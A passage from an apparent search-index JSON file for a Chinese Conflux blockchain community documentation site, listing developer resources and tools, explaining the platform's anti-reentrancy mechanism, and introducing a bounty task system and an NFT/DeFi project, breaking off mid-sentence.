UI\u5e93 \u5f00\u53d1\u8bf4\u660e \u00b6 Conflux\u7684 CVM \u548c EVM \u865a\u62df\u673a\u5c42\u7684\u4e3b\u8981\u533a\u522b \u5f53\u524d\u7248\u672cConflux \u9ed8\u8ba4\u6709\u53cd\u91cd\u5165\u673a\u5236\u3002\u91cd\u5165\u6307\u7684\u662f\u4e00\u4e2a\u5408\u7ea6\u5728\u8c03\u7528\u5176\u4ed6\u5408\u7ea6\u65f6\uff0c\u5176\u4ed6\u5408\u7ea6\u53c8\u76f4\u63a5\u6216\u95f4\u63a5\u5730\u8c03\u7528\u4e86\u8fd9\u4e2a\u5408\u7ea6\u3002\u6bd4\u5982\u5408\u7ea6 A \u8c03\u7528\u5408\u7ea6 B, \u5728\u5408\u7ea6 B \u6267\u884c\u671f\u95f4\uff0c\u53c8\u8c03\u7528\u4e86\u5408\u7ea6 A, \u5219\u6784\u6210\u4e86\u91cd\u5165\u8c03\u7528\u3002\u91cd\u5165\u8c03\u7528\u662f\u4e00\u4e9b Defi \u653b\u51fb\u7684\u539f\u56e0\u3002\u4f46\u662f\uff0c\u4e00\u4e9b\u903b\u8f91\u6b63\u5e38\u7684\u5408\u7ea6\u4e5f\u4f1a\u6709\u91cd\u5165\u8c03\u7528\u3002\u6bd4\u5982\u8bf4\uff0c\u5408\u7ea6 A \u8c03\u7528\u95ea\u7535\u8d37\u5408\u7ea6\uff0c\u95ea\u7535\u8d37\u8c03\u7528\u5408\u7ea6 A \u7684 callback \u51fd\u6570\uff0c\u5c31\u6784\u6210\u91cd\u5165\u8c03\u7528\u3002 Conflux \u9ed8\u8ba4\u5f00\u542f\u53cd\u91cd\u5165\u673a\u5236\uff0c\u5373\u91cd\u5165\u8c03\u7528\u53d1\u751f\u540e\uff0c\u6240\u6709\u5199\u64cd\u4f5c\u5c06\u88ab\u7981\u6b62\uff0c\u5305\u62ec\uff1a\u5411\u8d26\u672c\u5199\u5165\u6570\u636e \uff08SSTORE \u6307\u4ee4\uff09\uff0c\u53d1\u8d77\u6709\u8f6c\u8d26\u7684\u5408\u7ea6\u8c03\u7528\uff0c\u751f\u6210 event CIP \u00b6 Conflux \u6539\u8fdb\u63d0\u6848 Conflux CIP\u4ecb\u7ecd \u6280\u672f\u8bba\u575b \u00b6 Conflux\u793e\u533a\u8bba\u575b \u8282\u70b9\u4e0eRPC \u00b6 Conflux GPU \u6316\u77ff\u6559\u7a0b\u6587\u6863\uff08v1.1.2\uff09 Conflux\u7f51\u7edc\u4e2d\"\u5947\u5947\u602a\u602a\u201c\u7684Node Conflux RPC \u548c\u4ee5\u592a\u574a RPC\u7684 \u533a\u522b Conflux RPC \u5730\u5740\u5217\u8868(\u4ec5\u4f9b\u5f00\u53d1\u6d4b\u8bd5\u4f7f\u7528\uff0c\u4e0d\u4fdd\u8bc1\u53ef\u7528\u6027) \u5982\u4f55\u914d\u7f6e\u81ea\u5df1\u8282\u70b9\u7684rpc\u7aef\u53e3\u548c\u6570\u636e\u5b58\u653e\u8def\u5f84 Conflux\u7f51\u7edc\u4e0a\u9996\u6b3e\u7c7bInfura API\u8bbf\u95ee\u670d\u52a1\u9650\u65f6\u516c\u6d4b\u4e2d Conflux\u5f00\u53d1\u8005\u6587\u6863 \u00b6 \u5b98\u7f51 js-conflux-sdk Conflux js-sdk\u4e0e\u4ee5\u592a\u574aweb3. js\u533a\u522b \u5982\u4f55\u5728Conflux\u7f51\u7edc\u4e2d\u4f7f\u7528js-conflux-sdk\u6765\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684DApp onflux \u667a\u80fd\u5408\u7ea6\u5f00\u53d1\u4f53\u9a8c(js-conflux-sdk@0.13.4) java-conflux-sdk go-conflux-sdk Conflux SDK \u4f7f\u7528\u4f53\u9a8c\u6536\u96c6 Conflux V2\u786c\u5206\u53c9\u5f00\u53d1\u4ecb\u7ecd Conflux espace\u4ecb\u7ecd\uff1a\u5b8c\u5168\u517c\u5bb9EVM Dex\u5f00\u53d1\u6587\u6863 \u00b6 \u5f00\u53d1\u6587\u6863 Conflux \u8fdb\u9636\u8bfe | DEX \u53cc\u5b50\u534f\u8bae\uff1a\u94fe\u4e0a\u7ed3\u7b97 BoomFlow & \u94fe\u4e0b\u64ae\u5408 MatchFlow Conflux Shuttleflow\u6587\u6863 \u4f7f\u7528ShuttleFlow\u5b9e\u73b0ETH\u548ccETH\u4e4b\u95f4\u7684\u8f6c\u6362 \u5982\u4f55\u4f7f\u7528 ShuttleFlow \u5b9e\u73b0\u7075\u6d3b\u8de8\u94fe \u5185\u7f6e\u5408\u7ea6 \u00b6 \u5185\u7f6e\u5408\u7ea6 Conflux \u5185\u7f6e\u5408\u7ea6\u529f\u80fd\u8be6\u7ec6\u4ecb\u7ecd Conflux\u7684\u5b58\u50a8\u62b5\u62bc\u673a\u5236 \u65b0\u9879\u76ee\u5982\u4f55\u9ad8\u6548\u542f\u52a8\uff1fConflux \u4ee3\u4ed8\u673a\u5236\u4e86\u89e3\u4e00\u4e0b \u5f00\u53d1\u5de5\u5177\u6307\u5357 \u00b6 Conflux\u4e0e\u4ee5\u592a\u574a\u5408\u7ea6\u5f00\u53d1\u5de5\u5177\u533a\u522b Conflux \u5f00\u53d1\u6559\u7a0b | \u4f7f\u7528 IDE \u5f00\u53d1 DApp \u7684\u5b9e\u6218\u64cd\u4f5c\u6307\u5357 Conflux Studio \u5f00\u53d1 DApp \u6559\u7a0b Conflux Truffle \u4f7f\u7528\u5b8c\u5168\u6307\u5357 Conflux-remix\uff08Conflux\u793e\u533a\u81ea\u884c\u5f00\u53d1\uff09 \u4f7f\u7528Remix\u73a9\u8f6cConflux\u4e0a\u7684\u667a\u80fd\u5408\u7ea6","title":"\u5f00\u53d1\u8d44\u6e90"},{"location":"development/resources/#_1","text":"","title":"\u5f00\u53d1\u8d44\u6e90"},{"location":"development/resources/#_2","text":"Conflux\u5bf9\u63a5Q&A Conflux-faqs\u5408\u96c6 Conflux\u516c\u4f17\u53f7\u6280\u672f\u6587\u7ae0&\u6559\u7a0b&\u89c6\u9891&\u6f2b\u753b\u76ee\u5f55 Conflux UI\u5e93","title":"\u5e38\u7528"},{"location":"development/resources/#_3","text":"Conflux\u7684 CVM \u548c EVM \u865a\u62df\u673a\u5c42\u7684\u4e3b\u8981\u533a\u522b \u5f53\u524d\u7248\u672cConflux \u9ed8\u8ba4\u6709\u53cd\u91cd\u5165\u673a\u5236\u3002\u91cd\u5165\u6307\u7684\u662f\u4e00\u4e2a\u5408\u7ea6\u5728\u8c03\u7528\u5176\u4ed6\u5408\u7ea6\u65f6\uff0c\u5176\u4ed6\u5408\u7ea6\u53c8\u76f4\u63a5\u6216\u95f4\u63a5\u5730\u8c03\u7528\u4e86\u8fd9\u4e2a\u5408\u7ea6\u3002\u6bd4\u5982\u5408\u7ea6 A \u8c03\u7528\u5408\u7ea6 B, \u5728\u5408\u7ea6 B \u6267\u884c\u671f\u95f4\uff0c\u53c8\u8c03\u7528\u4e86\u5408\u7ea6 A, \u5219\u6784\u6210\u4e86\u91cd\u5165\u8c03\u7528\u3002\u91cd\u5165\u8c03\u7528\u662f\u4e00\u4e9b Defi \u653b\u51fb\u7684\u539f\u56e0\u3002\u4f46\u662f\uff0c\u4e00\u4e9b\u903b\u8f91\u6b63\u5e38\u7684\u5408\u7ea6\u4e5f\u4f1a\u6709\u91cd\u5165\u8c03\u7528\u3002\u6bd4\u5982\u8bf4\uff0c\u5408\u7ea6 A \u8c03\u7528\u95ea\u7535\u8d37\u5408\u7ea6\uff0c\u95ea\u7535\u8d37\u8c03\u7528\u5408\u7ea6 A \u7684 callback \u51fd\u6570\uff0c\u5c31\u6784\u6210\u91cd\u5165\u8c03\u7528\u3002 Conflux \u9ed8\u8ba4\u5f00\u542f\u53cd\u91cd\u5165\u673a\u5236\uff0c\u5373\u91cd\u5165\u8c03\u7528\u53d1\u751f\u540e\uff0c\u6240\u6709\u5199\u64cd\u4f5c\u5c06\u88ab\u7981\u6b62\uff0c\u5305\u62ec\uff1a\u5411\u8d26\u672c\u5199\u5165\u6570\u636e \uff08SSTORE \u6307\u4ee4\uff09\uff0c\u53d1\u8d77\u6709\u8f6c\u8d26\u7684\u5408\u7ea6\u8c03\u7528\uff0c\u751f\u6210 event","title":"\u5f00\u53d1\u8bf4\u660e"},{"location":"development/resources/#cip","text":"Conflux \u6539\u8fdb\u63d0\u6848 Conflux CIP\u4ecb\u7ecd","title":"CIP"},{"location":"development/resources/#_4","text":"Conflux\u793e\u533a\u8bba\u575b","title":"\u6280\u672f\u8bba\u575b"},{"location":"development/resources/#rpc","text":"Conflux GPU \u6316\u77ff\u6559\u7a0b\u6587\u6863\uff08v1.1.2\uff09 Conflux\u7f51\u7edc\u4e2d\"\u5947\u5947\u602a\u602a\u201c\u7684Node Conflux RPC \u548c\u4ee5\u592a\u574a RPC\u7684 \u533a\u522b Conflux RPC \u5730\u5740\u5217\u8868(\u4ec5\u4f9b\u5f00\u53d1\u6d4b\u8bd5\u4f7f\u7528\uff0c\u4e0d\u4fdd\u8bc1\u53ef\u7528\u6027) \u5982\u4f55\u914d\u7f6e\u81ea\u5df1\u8282\u70b9\u7684rpc\u7aef\u53e3\u548c\u6570\u636e\u5b58\u653e\u8def\u5f84 Conflux\u7f51\u7edc\u4e0a\u9996\u6b3e\u7c7bInfura API\u8bbf\u95ee\u670d\u52a1\u9650\u65f6\u516c\u6d4b\u4e2d","title":"\u8282\u70b9\u4e0eRPC"},{"location":"development/resources/#conflux","text":"\u5b98\u7f51 js-conflux-sdk Conflux js-sdk\u4e0e\u4ee5\u592a\u574aweb3. js\u533a\u522b \u5982\u4f55\u5728Conflux\u7f51\u7edc\u4e2d\u4f7f\u7528js-conflux-sdk\u6765\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684DApp onflux \u667a\u80fd\u5408\u7ea6\u5f00\u53d1\u4f53\u9a8c(js-conflux-sdk@0.13.4) java-conflux-sdk go-conflux-sdk Conflux SDK \u4f7f\u7528\u4f53\u9a8c\u6536\u96c6 Conflux V2\u786c\u5206\u53c9\u5f00\u53d1\u4ecb\u7ecd Conflux espace\u4ecb\u7ecd\uff1a\u5b8c\u5168\u517c\u5bb9EVM","title":"Conflux\u5f00\u53d1\u8005\u6587\u6863"},{"location":"development/resources/#dex","text":"\u5f00\u53d1\u6587\u6863 Conflux \u8fdb\u9636\u8bfe | DEX \u53cc\u5b50\u534f\u8bae\uff1a\u94fe\u4e0a\u7ed3\u7b97 BoomFlow & \u94fe\u4e0b\u64ae\u5408 MatchFlow Conflux Shuttleflow\u6587\u6863 \u4f7f\u7528ShuttleFlow\u5b9e\u73b0ETH\u548ccETH\u4e4b\u95f4\u7684\u8f6c\u6362 \u5982\u4f55\u4f7f\u7528 ShuttleFlow \u5b9e\u73b0\u7075\u6d3b\u8de8\u94fe","title":"Dex\u5f00\u53d1\u6587\u6863"},{"location":"development/resources/#_5","text":"\u5185\u7f6e\u5408\u7ea6 Conflux \u5185\u7f6e\u5408\u7ea6\u529f\u80fd\u8be6\u7ec6\u4ecb\u7ecd Conflux\u7684\u5b58\u50a8\u62b5\u62bc\u673a\u5236 \u65b0\u9879\u76ee\u5982\u4f55\u9ad8\u6548\u542f\u52a8\uff1fConflux \u4ee3\u4ed8\u673a\u5236\u4e86\u89e3\u4e00\u4e0b","title":"\u5185\u7f6e\u5408\u7ea6"},{"location":"development/resources/#_6","text":"Conflux\u4e0e\u4ee5\u592a\u574a\u5408\u7ea6\u5f00\u53d1\u5de5\u5177\u533a\u522b Conflux \u5f00\u53d1\u6559\u7a0b | \u4f7f\u7528 IDE \u5f00\u53d1 DApp \u7684\u5b9e\u6218\u64cd\u4f5c\u6307\u5357 Conflux Studio \u5f00\u53d1 DApp \u6559\u7a0b Conflux Truffle \u4f7f\u7528\u5b8c\u5168\u6307\u5357 Conflux-remix\uff08Conflux\u793e\u533a\u81ea\u884c\u5f00\u53d1\uff09 \u4f7f\u7528Remix\u73a9\u8f6cConflux\u4e0a\u7684\u667a\u80fd\u5408\u7ea6","title":"\u5f00\u53d1\u5de5\u5177\u6307\u5357"},{"location":"development/tools/","text":"\u5f00\u53d1\u5de5\u5177 \u00b6 \u80cc\u666f \u00b6 \u5de5\u6b32\u5584\u5176\u4e8b\uff0c\u5fc5\u5148\u5229\u5176\u5668\uff0c\u5728\u8fd9\u4e00\u5217\u8868\u4e2d\u6211\u4eec\u5c06\u63a8\u8350\u4e00\u4e9b\u5f00\u53d1\u5de5\u5177\uff0c\u6709\u4e86\u5de5\u5177\u7684\u52a0\u6301\uff0c\u80fd\u591f\u65b9\u4fbf\u5f00\u53d1\u8005\u66f4\u597d\u5730\u57fa\u4e8eConflux\u7f51\u7edc\u5f00\u53d1\u5404\u7c7b\u667a\u80fd\u5408\u7ea6\u3002 \u6e90\u4ee3\u7801\u7f16\u8f91\u5668 \u00b6 Visual Studio Code \uff1a\u7f16\u5199\u667a\u80fd\u5408\u7ea6\u9879\u76ee\u548c\u7f16\u8bd1\u5408\u7ea6\u7684\u5de5\u5177\uff0c\u5b98\u7f51\u514d\u8d39\u4e0b\u8f7d\u4f7f\u7528 IDE \u00b6 Conflux Studio\u5728\u7ebf\u96c6\u6210\u5f00\u53d1\u73af\u5883\uff08 \u514d\u4e0b\u8f7d\uff0c\u9700\u914d\u7f6e \u63d2\u4ef6\u94b1\u5305 \uff09\uff1a Conflux Studio Web Windows\u5e73\u53f0\u7248\u672cConflux Studio\uff1a Conflux Studio Windows Mac\u5e73\u53f0\u7248\u672cConflux Studio\uff1a Conflux Studio Mac Linux\u5e73\u53f0\u7248\u672c\uff1a Conflux Studio Linux Conflux Studio\u5404\u529f\u80fd\u70b9\u4ecb\u7ecd\uff1a \u4f7f\u7528\u624b\u518c \uff1a Conflux Studio\u5f00\u53d1\u6559\u7a0b\uff1a \u5f00\u53d1\u6559\u7a0b \uff1a Info \u5728\u7535\u8111\u4e2d\u5b89\u88c5Conflux Studio\u53ef\u80fd\u9762\u4e34\u4e24\u4e2a\u96be\u70b9\uff1a\u5373docker\u5b89\u88c5\u548cconflux rust\u7684\u5b89\u88c5\uff0c \u4f46\u4e24\u9879\u5e76\u975e\u5fc5\u987b\u9879 \uff0c\u5b89\u88c5\u4ed6\u4eec\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u5728\u4f60\u7684\u7535\u8111\u5185\u5b9e\u73b0\u4e00\u4e2a\u672c\u5730\u79c1\u6709\u6d4b\u8bd5\u94fe\uff0c\u5982\u679c\u4e0d\u9700\u8981\u79c1\u6709\u6d4b\u8bd5\u7ebf\u800c\u662f\u76f4\u63a5\u4f7f\u7528\u6d4b\u8bd5\u7f51\u548c\u6b63\u5f0f\u7f51\u5219\u65e0\u9700\u5b89\u88c5\u3002 JS environment \u00b6 Node JS\u4e0b\u8f7d Info \uff08\u96441\uff1a\u5ed6\u96ea\u5cf0\u7684nodejs \u5b89\u88c5\u914d\u7f6e\u6559\u7a0bhttps:// www.liaoxuefeng.com/wiki/1022910821149312/1023025597810528 \uff09 Info \uff08\u96442\uff1a\u5ed6\u96ea\u5cf0\u7684nodejs\u6559\u7a0b\uff0c https://www.liaoxuefeng.com/wiki/1022910821149312/1023025597810528 \uff09 Conflux truffle\uff08\u7f16\u8bd1\uff0c\u8c03\u8bd5\uff09 \u00b6 Conflux-truffle\u5f00\u6e90\u4ed3\u5e93 Conflux truffle\u914d\u7f6e\u6559\u7a0b \u5b89\u88c5\u547d\u4ee4\uff08node js\u81ea\u5e26npm\u547d\u4ee4\uff09\uff1a npm install -g cfxtruffle Conflux remix \u00b6 Conflux-remix\u5de5\u5177 \u94b1\u5305\u63d2\u4ef6 \u00b6 \u5b98\u65b9\u63d2\u4ef6\u94b1\u5305\uff1a Conflux Portal Info \u94b1\u5305\u914d\u7f6e\u6559\u7a0b\u8be6\u89c1\uff1a Portal\u5b89\u88c5","title":"\u5f00\u53d1\u5de5\u5177"},{"location":"development/tools/#_1","text":"","title":"\u5f00\u53d1\u5de5\u5177"},{"location":"development/tools/#_2","text":"\u5de5\u6b32\u5584\u5176\u4e8b\uff0c\u5fc5\u5148\u5229\u5176\u5668\uff0c\u5728\u8fd9\u4e00\u5217\u8868\u4e2d\u6211\u4eec\u5c06\u63a8\u8350\u4e00\u4e9b\u5f00\u53d1\u5de5\u5177\uff0c\u6709\u4e86\u5de5\u5177\u7684\u52a0\u6301\uff0c\u80fd\u591f\u65b9\u4fbf\u5f00\u53d1\u8005\u66f4\u597d\u5730\u57fa\u4e8eConflux\u7f51\u7edc\u5f00\u53d1\u5404\u7c7b\u667a\u80fd\u5408\u7ea6\u3002","title":"\u80cc\u666f"},{"location":"development/tools/#_3","text":"Visual Studio Code \uff1a\u7f16\u5199\u667a\u80fd\u5408\u7ea6\u9879\u76ee\u548c\u7f16\u8bd1\u5408\u7ea6\u7684\u5de5\u5177\uff0c\u5b98\u7f51\u514d\u8d39\u4e0b\u8f7d\u4f7f\u7528","title":"\u6e90\u4ee3\u7801\u7f16\u8f91\u5668"},{"location":"development/tools/#ide","text":"Conflux Studio\u5728\u7ebf\u96c6\u6210\u5f00\u53d1\u73af\u5883\uff08 \u514d\u4e0b\u8f7d\uff0c\u9700\u914d\u7f6e \u63d2\u4ef6\u94b1\u5305 \uff09\uff1a Conflux Studio Web Windows\u5e73\u53f0\u7248\u672cConflux Studio\uff1a Conflux Studio Windows Mac\u5e73\u53f0\u7248\u672cConflux Studio\uff1a Conflux Studio Mac Linux\u5e73\u53f0\u7248\u672c\uff1a Conflux Studio Linux Conflux Studio\u5404\u529f\u80fd\u70b9\u4ecb\u7ecd\uff1a \u4f7f\u7528\u624b\u518c \uff1a Conflux Studio\u5f00\u53d1\u6559\u7a0b\uff1a \u5f00\u53d1\u6559\u7a0b \uff1a Info \u5728\u7535\u8111\u4e2d\u5b89\u88c5Conflux Studio\u53ef\u80fd\u9762\u4e34\u4e24\u4e2a\u96be\u70b9\uff1a\u5373docker\u5b89\u88c5\u548cconflux rust\u7684\u5b89\u88c5\uff0c \u4f46\u4e24\u9879\u5e76\u975e\u5fc5\u987b\u9879 \uff0c\u5b89\u88c5\u4ed6\u4eec\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u5728\u4f60\u7684\u7535\u8111\u5185\u5b9e\u73b0\u4e00\u4e2a\u672c\u5730\u79c1\u6709\u6d4b\u8bd5\u94fe\uff0c\u5982\u679c\u4e0d\u9700\u8981\u79c1\u6709\u6d4b\u8bd5\u7ebf\u800c\u662f\u76f4\u63a5\u4f7f\u7528\u6d4b\u8bd5\u7f51\u548c\u6b63\u5f0f\u7f51\u5219\u65e0\u9700\u5b89\u88c5\u3002","title":"IDE"},{"location":"development/tools/#js-environment","text":"Node JS\u4e0b\u8f7d Info \uff08\u96441\uff1a\u5ed6\u96ea\u5cf0\u7684nodejs \u5b89\u88c5\u914d\u7f6e\u6559\u7a0bhttps:// www.liaoxuefeng.com/wiki/1022910821149312/1023025597810528 \uff09 Info \uff08\u96442\uff1a\u5ed6\u96ea\u5cf0\u7684nodejs\u6559\u7a0b\uff0c https://www.liaoxuefeng.com/wiki/1022910821149312/1023025597810528 \uff09","title":"JS environment"},{"location":"development/tools/#conflux-truffle","text":"Conflux-truffle\u5f00\u6e90\u4ed3\u5e93 Conflux truffle\u914d\u7f6e\u6559\u7a0b \u5b89\u88c5\u547d\u4ee4\uff08node js\u81ea\u5e26npm\u547d\u4ee4\uff09\uff1a npm install -g cfxtruffle","title":"Conflux truffle\uff08\u7f16\u8bd1\uff0c\u8c03\u8bd5\uff09"},{"location":"development/tools/#conflux-remix","text":"Conflux-remix\u5de5\u5177","title":"Conflux remix"},{"location":"development/tools/#_4","text":"\u5b98\u65b9\u63d2\u4ef6\u94b1\u5305\uff1a Conflux Portal Info \u94b1\u5305\u914d\u7f6e\u6559\u7a0b\u8be6\u89c1\uff1a Portal\u5b89\u88c5","title":"\u94b1\u5305\u63d2\u4ef6"},{"location":"ecosystem/bountyv2/","text":"Bounty V2 \u8d4f\u91d1\u4efb\u52a1\u7cfb\u7edf \u00b6 \u751f\u6001\u4ecb\u7ecd \u00b6 Bounty v2.0\u4e0a\u7ebf\u5566\uff0c\u8d85\u591a\u9879\u76ee\u8054\u52a8\uff1a \u70bc\u4e39\u897f\u6e38\u3001\u5b9d\u846b\u82a6\u684c\u9762\u3001ConfluxBPM\u3001NFTBox\u3001Trust Domain\u3001\u795e\u7b14\u9a6c\u826f\u3001Tspace \u8d85\u591a\u8585\u7f8a\u6bdb\u4efb\u52a1\uff1a \u7ed1\u5b9aPandanlD\u3001\u897f\u6e38\u95ef\u5173\u3001\u7ffb\u8bd1\u6545\u4e8b\u3001\u4f18\u5316\u5f00\u53d1\u3001\u8bbe\u8ba1\u6d77\u62a5\u3001\u9080\u8bf7\u597d\u53cb\u3001\u5408\u6210\u70e4\u725b\u7b49 \u751f\u6001\u94fe\u63a5 \u00b6 Bounty v2\u516c\u6d4b\u7248\u4e3b\u9875 Bounty\u8d4f\u91d1\u4efb\u52a1\u8bba\u575b\u677f\u5757 \u751f\u6001\u529f\u80fd\u4ecb\u7ecd \u00b6 Bounty V2\u4e3b\u8981\u5305\u62ec\uff1a \u6280\u80fd\uff1a\u6307\u5bfc\u7528\u6237\u5b89\u88c5Portal\u53ca\u4f7f\u7528\u793e\u4ea4\u8d26\u53f7\u7ed1\u5b9aPanda ID Portal\u5b89\u88c5\u6559\u7a0b\u53ef \u53c2\u8003\u94fe\u63a5 \u3002 \u70ed\u95e8\u4efb\u52a1\uff1a\u63a2\u7d22Bounty V2\u7684\u70ed\u95e8\u8d4f\u91d1\u4efb\u52a1 \u5168\u90e8\u4efb\u52a1\uff1a\u67e5\u770bBounty V2\u4e2d\u7684\u6240\u6709\u8d4f\u91d1\u4efb\u52a1 \u9879\u76ee\uff1a\u5df2\u63a5\u5165Bounty V2\u7684\u751f\u6001\u9879\u76ee\uff0c\u70b9\u51fb\u8fdb\u5165\u67d0\u4e00\u4e2a\u9879\u76ee\uff0c\u53ef\u4ee5\u67e5\u770b\u8be5\u9879\u76ee\u65b9\u53d1\u5e03\u7684\u751f\u6001\u4efb\u52a1 Bounty V2\u4f7f\u7528\u6559\u7a0b \u00b6 \u5b98\u65b9\u5df2\u63d0\u4f9b\u5b8c\u5584\u7684Bounty V2\u6559\u7a0b\uff0c\u5217\u8868\u5982\u4e0b\uff1a Bounty V2\u7ed1\u5b9aPandaID\u9886\u53d6CFX\u6559\u7a0b \uff1a\u7ed1\u5b9aPandaID\u6559\u7a0b Bounty v2.0 \u4f7f\u7528\u6307\u5357 \uff1a\u63a5\u53d6\u4efb\u52a1\u3001\u53d1\u5e03\u4efb\u52a1\u3001\u63d0\u4ea4\u4efb\u52a1\u3002 Bounty v2.0 \u5e38\u89c1\u95ee\u9898\u89e3\u7b54 \uff1a\u5e38\u89c1\u95ee\u9898\u7b54\u7591","title":"Bounty V2 \u8d4f\u91d1\u4efb\u52a1\u7cfb\u7edf"},{"location":"ecosystem/bountyv2/#bounty-v2","text":"","title":"Bounty V2 \u8d4f\u91d1\u4efb\u52a1\u7cfb\u7edf"},{"location":"ecosystem/bountyv2/#_1","text":"Bounty v2.0\u4e0a\u7ebf\u5566\uff0c\u8d85\u591a\u9879\u76ee\u8054\u52a8\uff1a \u70bc\u4e39\u897f\u6e38\u3001\u5b9d\u846b\u82a6\u684c\u9762\u3001ConfluxBPM\u3001NFTBox\u3001Trust Domain\u3001\u795e\u7b14\u9a6c\u826f\u3001Tspace \u8d85\u591a\u8585\u7f8a\u6bdb\u4efb\u52a1\uff1a \u7ed1\u5b9aPandanlD\u3001\u897f\u6e38\u95ef\u5173\u3001\u7ffb\u8bd1\u6545\u4e8b\u3001\u4f18\u5316\u5f00\u53d1\u3001\u8bbe\u8ba1\u6d77\u62a5\u3001\u9080\u8bf7\u597d\u53cb\u3001\u5408\u6210\u70e4\u725b\u7b49","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/bountyv2/#_2","text":"Bounty v2\u516c\u6d4b\u7248\u4e3b\u9875 Bounty\u8d4f\u91d1\u4efb\u52a1\u8bba\u575b\u677f\u5757","title":"\u751f\u6001\u94fe\u63a5"},{"location":"ecosystem/bountyv2/#_3","text":"Bounty V2\u4e3b\u8981\u5305\u62ec\uff1a \u6280\u80fd\uff1a\u6307\u5bfc\u7528\u6237\u5b89\u88c5Portal\u53ca\u4f7f\u7528\u793e\u4ea4\u8d26\u53f7\u7ed1\u5b9aPanda ID Portal\u5b89\u88c5\u6559\u7a0b\u53ef \u53c2\u8003\u94fe\u63a5 \u3002 \u70ed\u95e8\u4efb\u52a1\uff1a\u63a2\u7d22Bounty V2\u7684\u70ed\u95e8\u8d4f\u91d1\u4efb\u52a1 \u5168\u90e8\u4efb\u52a1\uff1a\u67e5\u770bBounty V2\u4e2d\u7684\u6240\u6709\u8d4f\u91d1\u4efb\u52a1 \u9879\u76ee\uff1a\u5df2\u63a5\u5165Bounty V2\u7684\u751f\u6001\u9879\u76ee\uff0c\u70b9\u51fb\u8fdb\u5165\u67d0\u4e00\u4e2a\u9879\u76ee\uff0c\u53ef\u4ee5\u67e5\u770b\u8be5\u9879\u76ee\u65b9\u53d1\u5e03\u7684\u751f\u6001\u4efb\u52a1","title":"\u751f\u6001\u529f\u80fd\u4ecb\u7ecd"},{"location":"ecosystem/bountyv2/#bounty-v2_1","text":"\u5b98\u65b9\u5df2\u63d0\u4f9b\u5b8c\u5584\u7684Bounty V2\u6559\u7a0b\uff0c\u5217\u8868\u5982\u4e0b\uff1a Bounty V2\u7ed1\u5b9aPandaID\u9886\u53d6CFX\u6559\u7a0b \uff1a\u7ed1\u5b9aPandaID\u6559\u7a0b Bounty v2.0 \u4f7f\u7528\u6307\u5357 \uff1a\u63a5\u53d6\u4efb\u52a1\u3001\u53d1\u5e03\u4efb\u52a1\u3001\u63d0\u4ea4\u4efb\u52a1\u3002 Bounty v2.0 \u5e38\u89c1\u95ee\u9898\u89e3\u7b54 \uff1a\u5e38\u89c1\u95ee\u9898\u7b54\u7591","title":"Bounty V2\u4f7f\u7528\u6559\u7a0b"},{"location":"ecosystem/core-espace/","text":"Corespace \u4e0e espace \u8de8\u7a7a\u95f4 \u00b6 \u6559\u7a0b \u00b6 \u4e3a\u65b9\u4fbf\u7528\u6237\u5c06 Corespace \u4e2d\u7684\u8d44\u4ea7\u5feb\u6377\u7684\u8fdb\u5165 espace \u53c2\u4e0e\u5982 Swappi DEX\u751f\u6001","title":"Corespace \u4e0e espace \u8de8\u7a7a\u95f4"},{"location":"ecosystem/core-espace/#corespace-espace","text":"","title":"Corespace \u4e0e espace \u8de8\u7a7a\u95f4"},{"location":"ecosystem/core-espace/#_1","text":"\u4e3a\u65b9\u4fbf\u7528\u6237\u5c06 Corespace \u4e2d\u7684\u8d44\u4ea7\u5feb\u6377\u7684\u8fdb\u5165 espace \u53c2\u4e0e\u5982 Swappi DEX\u751f\u6001","title":"\u6559\u7a0b"},{"location":"ecosystem/dan/","text":"\u70bc\u4e39\u897f\u6e38 \u00b6 \u751f\u6001\u4ecb\u7ecd \u00b6 \u6211\u56fd\u56db\u5927\u540d\u8457\u4e2d\uff0c\u7ea2\u697c\u68a6\u3001\u6c34\u6d52\u4f20\u3001\u4e09\u56fd\u6f14\u827a\u3001\u897f\u6e38\u8bb0\u90fd\u6709\u7ecf\u5178\u8fde\u73af\u753b\uff0c\u6211\u4eec\u6709\u8ba1\u5212\u5c06\u5b83\u4eec\u4ee5NFT\u7684\u5f62\u5f0f\u505a\u6210\u9ad8\u6e05\u6570\u5b57\u6536\u85cf\u7248\u3002\u5bf9\u4e8e\u897f\u6e38\u8bb0\u5f88\u591a\u670b\u53cb\u4f1a\u6709\u4e2a\u7591\u95ee\uff1a\u4e5d\u4e5d\u516b\u5341\u4e00\u96be\u6ca1\u6709\u770b\u5168\u8fc7\uff0c\u603b\u611f\u89c9\u5c11\u4e86\u4e00\u4e9b\u3002\u6240\u4ee5\u6211\u4eec\u65b0\u7ed8\u5236\u4e00\u5957\u6309\u7167\u516b\u5341\u4e00\u96be\u7684\u897f\u6e38\u620f\u7ed8\u753b\u5e76\u53d1\u884cNFT\uff0c\u4ece\u65b0\u7684\u89d2\u5ea6\u91cd\u6e29\u53d6\u7ecf\u8bb0\u5fc6\uff0c\u4f7f\u7528\u533a\u5757\u94fe\u6280\u672f\u521b\u9020\u897f\u6e38\u5143\u5b87\u5b99\uff0c\u5f18\u626c\u4e2d\u534e\u6587\u5316\u3002\u73b0\u5728\u533a\u5757\u94fe\u7684\u5e38\u89c1DeFi\u73a9\u6cd5\uff0c\u6bcf\u79cdToken\u9700\u8981\u5355\u72ec\u5efa\u7acb\u6c60\u5b50\uff0c\u5355\u72ec\u64cd\u4f5c\u3002\u5927\u5bb6\u62e5\u6709\u7684\u533a\u5757\u94fe\u6570\u5b57\u8d44\u4ea7\u79cd\u7c7b\u8d8a\u6765\u8d8a\u591a\uff0c\u64cd\u4f5c\u8d8a\u6765\u8d8a\u7e41\u7410\u3002\u5f88\u591a\u4f53\u91cf\u4e0d\u591f\u5927\u7684\u8d44\u4ea7\u5f80\u5f80\u6ca1\u6709\u65e0\u635f\u6316\u77ff\u7684\u6e20\u9053\uff0c\u4e00\u4e9b\u5c0f\u989d\u8d44\u4ea7\u5927\u5bb6\u4e5f\u61d2\u5f97\u8fdb\u884c\u8d28\u62bc\u3002\u6211\u4eec\u9996\u521b\u70bc\u4e39\u65b0\u73a9\u6cd5\uff1a\u5f88\u591a\u79cd\u8d44\u4ea7\u53ef\u4ee5\u540c\u65f6\u8d28\u62bc\u5230\u4e00\u4e2a\u70bc\u4e39\u7089\u5185\u83b7\u5f97